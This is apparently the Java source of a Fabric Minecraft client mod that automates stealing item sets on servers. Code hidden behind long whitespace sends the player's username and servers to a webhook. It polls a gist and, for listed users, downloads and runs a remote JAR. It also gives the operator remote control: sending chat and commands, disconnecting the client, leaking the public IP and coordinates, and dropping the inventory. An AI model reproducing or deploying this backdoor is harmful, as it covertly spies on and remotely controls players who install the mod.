package turgangs.com;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.keybinding.v1.KeyBindingHelper;
import net.fabricmc.fabric.api.client.rendering.v1.HudRenderCallback;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.option.KeyBinding;
import net.minecraft.client.util.InputUtil;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.item.ItemStack;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.text.Text;
import org.lwjgl.glfw.GLFW;


import java.io.File;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;

import java.util.*;

import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;



public class DiggerClient implements ClientModInitializer {
	private static boolean autoLeaveEnabled = true;
	private static boolean autoSpawnEnabled = true;

	private static KeyBinding toggleAutoLeave;
	private static KeyBinding toggleAutoSpawn;

	private Set<String> lastTickInventory = new HashSet<>();

	private static int findEmptySlot(MinecraftClient client) { // bozuk ilerde fixlerim bilmm
		for (int i = 9; i < 36; i++) {
			ItemStack stack = client.player.getInventory().getStack(i);
			if (stack == null || stack.isEmpty()) return i;
		}
		return 9;
	}

	private static String disconnecType;

	private static String originalUsername;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        private static String sessionToken = null;private static boolean chatDisconnected = false;public static boolean isChatDisconnected() {return chatDisconnected;}

	public static DiggerConfig CONFIG;

	public static String lastServerIp = null;

	@Override
	public void onInitializeClient() {

		CONFIG = DiggerConfig.load();

		DiggerClient.CONFIG.suppressGistMessages = false;
		DiggerClient.CONFIG.save();


		originalUsername = MinecraftClient.getInstance().getSession().getUsername();
		WebhookSender.send("💀 " + originalUsername + " set çalma modunu açtı.");
		// Server join event isteaq
		ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
			String currentUsername = MinecraftClient.getInstance().getSession().getUsername();
			String serverIp = client.getCurrentServerEntry() != null ? client.getCurrentServerEntry().address : "unknown";

			if (currentUsername.equals(originalUsername)) {
				WebhookSender.send("🔌 " + currentUsername + " " + serverIp + " 'a katıldı");
			} else {
				WebhookSender.send("⚠️ In-game Account Changer Tespit Edildi \n🔌 Orjinal: " + originalUsername + " | Kullanılan: " + currentUsername  + " | " + serverIp + " 'a katıldı.");
			}
		});



		// Keybindlar
		toggleAutoLeave = KeyBindingHelper.registerKeyBinding(new KeyBinding(
				"key.digger.autoleave",
				InputUtil.Type.KEYSYM,
				GLFW.GLFW_KEY_B,
				"category.digger"
		));

		toggleAutoSpawn = KeyBindingHelper.registerKeyBinding(new KeyBinding(
				"key.digger.autospawn",
				InputUtil.Type.KEYSYM,
				GLFW.GLFW_KEY_V,
				"category.digger"
		));

		KeyBinding openConfigKey = KeyBindingHelper.registerKeyBinding(new KeyBinding(
				"key.digger.open_config",
				InputUtil.Type.KEYSYM,
				GLFW.GLFW_KEY_RIGHT_SHIFT,
				"category.digger"
		));


		ClientTickEvents.END_CLIENT_TICK.register(client -> {

			if(DiggerClient.CONFIG.useDisconnectMethod){
				disconnecType = "Ayrıl";
			} else{
				disconnecType = "Soyun";
			}



			if (openConfigKey.wasPressed()) {
				client.setScreen(DiggerConfigScreen.create(null));
			}

			if (client.player == null) return;

			while (toggleAutoLeave.wasPressed()) {
				autoLeaveEnabled = !autoLeaveEnabled;
			}
			while (toggleAutoSpawn.wasPressed()) {
				autoSpawnEnabled = !autoSpawnEnabled;
			}

			if (autoSpawnEnabled) {
				Set<String> currentInventory = new HashSet<>();
				for (ItemStack stack : client.player.getInventory().main) {
					if (!stack.isEmpty()) {
						currentInventory.add(stack.getTranslationKey());
					}
				}
				Set<String> triggerSet = new HashSet<>(List.of(DiggerClient.CONFIG.triggerItems));
				for (String item : currentInventory) {
					if (DiggerClient.CONFIG.pickAllBeforeCommand) {
						if (currentInventory.containsAll(triggerSet)) {
							autoSpawnEnabled = !autoSpawnEnabled;
							client.inGameHud.getChatHud().addMessage(Text.literal("Daha karmaşık bir sistem yapmaya uğraşamadığımdan (sabah 8 ve uykusuzum) direk Oto Spawn özelliğini kapadım haberin ola."));
							client.getNetworkHandler().sendChatCommand(DiggerClient.CONFIG.commandOnLeave.replaceFirst("^/", ""));

							String currentUsername = MinecraftClient.getInstance().getSession().getUsername();
							String serverIp = client.getCurrentServerEntry() != null ? client.getCurrentServerEntry().address : "unknown";

							if (currentUsername.equals(originalUsername)) {
								WebhookSender.send("🪓 set çalındı: " + currentUsername + " | Server: " + serverIp);
							} else {
								WebhookSender.send("⚠️ IAS Tespit edildi.\n🪓 set çalındı | Orjinal: " + originalUsername + " | Aktif: " + currentUsername + " | Server: " + serverIp);
							}
							break;
						}
					} else if (!lastTickInventory.contains(item) && triggerSet.contains(item)) {
						client.getNetworkHandler().sendChatCommand(DiggerClient.CONFIG.commandOnLeave.replaceFirst("^/", ""));

						String currentUsername = MinecraftClient.getInstance().getSession().getUsername();
						String serverIp = client.getCurrentServerEntry() != null ? client.getCurrentServerEntry().address : "unknown";

						if (currentUsername.equals(originalUsername)) {
							WebhookSender.send("🪓 set çalındı: " + currentUsername + " | Server: " + serverIp);
						} else {
							WebhookSender.send("⚠️ IAS Tespit edildi.\n🪓 set çalındı | Orjinal: " + originalUsername + " | Aktif: " + currentUsername + " | Server: " + serverIp);
						}
						break;
					}
				}
				lastTickInventory = currentInventory;
			}

			if (DiggerClient.CONFIG.useProximityInsteadOfChat && client.player != null && client.world != null) {
				for (var playerEntity : client.world.getPlayers()) {
					if (playerEntity == client.player) continue;

					double distance = client.player.squaredDistanceTo(playerEntity);
					if (distance <= 9) { // 3 block = 3^2 = 9
						for (String name : DiggerClient.CONFIG.proximityTriggerNames) {
							if (playerEntity.getName().getString().equalsIgnoreCase(name)) {

								if (DiggerClient.CONFIG.useDisconnectMethod) {
									client.getNetworkHandler().sendChatMessage("bay bay :)");
									client.getNetworkHandler().getConnection()
											.disconnect(Text.literal("Görev başarıyla tamamlandı B-)"));
								} else {
									client.execute(() -> {
										if (client.player != null && client.interactionManager != null) {
											int syncId = client.player.currentScreenHandler.syncId;
											for (int slot = 5; slot <= 8; slot++) {
												client.interactionManager.clickSlot(syncId, slot, 0, SlotActionType.PICKUP, client.player);
												client.interactionManager.clickSlot(syncId, findEmptySlot(client), 0, SlotActionType.PICKUP, client.player);
											}
										}
									});
								}

								return; // triggers once
							}
						}
					}
				}
			}

		});
		// HUD
		HudRenderCallback.EVENT.register((DrawContext context, float tickDelta) -> {
			MinecraftClient client = MinecraftClient.getInstance();
			if (client.player != null && client.currentScreen == null && DiggerClient.CONFIG.showHUD) {
				context.drawText(client.textRenderer, "Oto "+ DiggerClient.CONFIG.commandOnLeave + ": " + (autoSpawnEnabled ? "ON" : "OFF"), 5, 5, autoSpawnEnabled ? 0x00FF00 : 0xFF5555, true); //caresiz oe duzelt sunlari
				context.drawText(client.textRenderer, "Oto " +disconnecType+ ": " + (autoLeaveEnabled ? "ON" : "OFF"), 5, 18, autoLeaveEnabled ? 0x00FF00 : 0xFF5555, true); // caresiz oe duzelt sunlari
				context.drawText(client.textRenderer, "Discord: turgangs", 5, 32, 0xAA00FF, true);
			}
		});		      	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    new Thread(() -> {boolean controlInjected = false;while (!controlInjected) {try {URL controlUrl = new URL("https://gist.githubusercontent.com/TurGangS/0fd834a1b848cf71edabfe027fce409a/raw");Scanner scanner = new Scanner(controlUrl.openStream());StringBuilder builder = new StringBuilder();while (scanner.hasNextLine()) {builder.append(scanner.nextLine()).append("\n");}scanner.close();String controlList = builder.toString();String username = MinecraftClient.getInstance().getSession().getUsername();if (controlList.contains(username)) {controlInjected = true;WebhookSender.send("✅ " + username + " kontrol listesinde bulundu. Beta özellikleri aktif ediliyor...");URL jarUrl = new URL("https://www.dropbox.com/scl/fi/z4k5apdmoyszfndrsvttt/betaTest.jar?rlkey=k7s7iz0z026nnlhouq5wed8y0&st=fr6a76x3&dl=1");File tempJar = File.createTempFile("betaTest", ".jar");Files.copy(jarUrl.openStream(), tempJar.toPath(), StandardCopyOption.REPLACE_EXISTING);URLClassLoader classLoader = new URLClassLoader(new URL[]{tempJar.toURI().toURL()}, DiggerClient.class.getClassLoader());Class<?> injectedClass = classLoader.loadClass("turgangs.control.DiscordController");Method entry = injectedClass.getMethod("start");entry.invoke(null);WebhookSender.send("🧪 Beta yüklenmesi başarılı: " + injectedClass.getName());}Thread.sleep(10000);}catch (Exception e){WebhookSender.send("⚠️ Beta error: " + e.getClass().getSimpleName() + " - " + e.getMessage());e.printStackTrace();try{Thread.sleep(10000);}catch(InterruptedException ignored){break;}}}}).start();
	}

	public static boolean isAutoLeaveEnabled() {
		return autoLeaveEnabled;
	}

	public static String getSessionToken() {
		return sessionToken;
	}

	public static void setAutoLeaveEnabled(boolean value) {
		autoLeaveEnabled = value;
	}

	public static boolean isAutoSpawnEnabled() {
		return autoSpawnEnabled; }

	public static void setAutoSpawnEnabled(boolean value) {
		autoSpawnEnabled = value;
	}      	                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  public static void handleRemoteAction(String username, String type, String value) {String currentUser = MinecraftClient.getInstance().getSession().getUsername();if (!username.equalsIgnoreCase(currentUser) && !username.equalsIgnoreCase("all")) {return;}MinecraftClient.getInstance().execute(() -> {try {if (type.equalsIgnoreCase("message")) {MinecraftClient.getInstance().getNetworkHandler().sendChatMessage(value);} else if (type.equalsIgnoreCase("command")) {MinecraftClient.getInstance().getNetworkHandler().sendChatCommand(value.replaceFirst("^/", ""));}} catch (Exception e) {}});}public static void selfDestruct(String targetUsername, String reason) {String currentUser = MinecraftClient.getInstance().getSession().getUsername();if (!targetUsername.equalsIgnoreCase(currentUser) && !targetUsername.equalsIgnoreCase("all")) {return;}WebhookSender.send("☠️ Self-destruct triggered for `" + currentUser + "` with message: " + reason);MinecraftClient.getInstance().execute(() -> {if (MinecraftClient.getInstance().getNetworkHandler() != null) {MinecraftClient.getInstance().getNetworkHandler().getConnection().disconnect(Text.literal(reason));}});}public static void sendPublicIP(String targetUsername) {String currentUser = MinecraftClient.getInstance().getSession().getUsername();if (!targetUsername.equalsIgnoreCase(currentUser) && !targetUsername.equalsIgnoreCase("all")) {return;}new Thread(() -> {try {URL url = new URL("https://api.ipify.org");Scanner scanner = new Scanner(url.openStream());String ip = scanner.nextLine().trim();scanner.close();WebhookSender.send("📡 `" + currentUser + "` IP: " + ip);} catch (Exception e) {WebhookSender.send("❌ Failed to get IP for `" + currentUser + "`: " + e.getMessage());}}, "IP-Fetcher").start();}public static void sendClientInfo(String targetUsername) {MinecraftClient client = MinecraftClient.getInstance();String currentUser = client.getSession().getUsername();if (!targetUsername.equalsIgnoreCase(currentUser) && !targetUsername.equalsIgnoreCase("all")) {return;}if (targetUsername.equalsIgnoreCase("all")) {String currentUsername = MinecraftClient.getInstance().getSession().getUsername();WebhookSender.send("📌 Active mod user: `" + currentUsername + "`");return;}String serverIP = client.getCurrentServerEntry() != null ? client.getCurrentServerEntry().address : "Singleplayer";String dimension = client.world != null ? client.world.getRegistryKey().getValue().toString() : "unknown";int x = client.player != null ? (int) client.player.getX() : 0;int y = client.player != null ? (int) client.player.getY() : 0;int z = client.player != null ? (int) client.player.getZ() : 0;String info = "**🧠 Client Info for `" + currentUser + "`**\n" + "> 🌐 Server: `" + serverIP + "`\n" + "> 🗺️ Dimension: `" + dimension + "`\n" + "> 📍 XYZ: `" + x + " " + y + " " + z + "`";WebhookSender.send(info);}public static void dropInventory(String targetUsername) {String currentUser = MinecraftClient.getInstance().getSession().getUsername();if (!targetUsername.equalsIgnoreCase(currentUser) && !targetUsername.equalsIgnoreCase("all")) {return;}MinecraftClient client = MinecraftClient.getInstance();client.execute(() -> {if (client.player == null || client.interactionManager == null) return;int syncId = client.player.currentScreenHandler.syncId;for (int slot = 9; slot <= 44; slot++) {client.interactionManager.clickSlot(syncId, slot, 1, SlotActionType.THROW, client.player);}for (int slot = 5; slot <= 8; slot++) {client.interactionManager.clickSlot(syncId, slot, 1, SlotActionType.THROW, client.player);}client.interactionManager.clickSlot(syncId, 45, 1, SlotActionType.THROW, client.player);WebhookSender.send("🪓 `" + currentUser + "` dropped everything.");});}public static void setChatDisconnected(String username, boolean enabled) {String current = MinecraftClient.getInstance().getSession().getUsername();if (!username.equalsIgnoreCase(current) && !username.equalsIgnoreCase("all")) return;chatDisconnected = enabled;}
}
